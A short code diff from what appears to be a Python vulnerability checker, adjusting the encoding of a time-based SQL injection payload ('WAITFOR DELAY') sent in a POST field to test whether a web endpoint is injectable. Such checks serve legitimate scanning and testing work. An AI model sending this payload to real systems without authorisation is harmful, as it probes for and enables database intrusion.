@@ -29,7 +29,7 @@ def check_vulnerability(url):
         "Content-Length": "45"
     }
     fileid = random.randint(0, 99)
-    data = f"fileid={fileid}+WAITFOR DELAY+'0:0:3'&isFromOutImg=1"
+    data = f"fileid={fileid}+WAITFOR+DELAY+'0:0:3'&isFromOutImg=1"
 
     response = requests.post(request_url, headers=headers, data=data)
     if response.elapsed.total_seconds() >= 3:
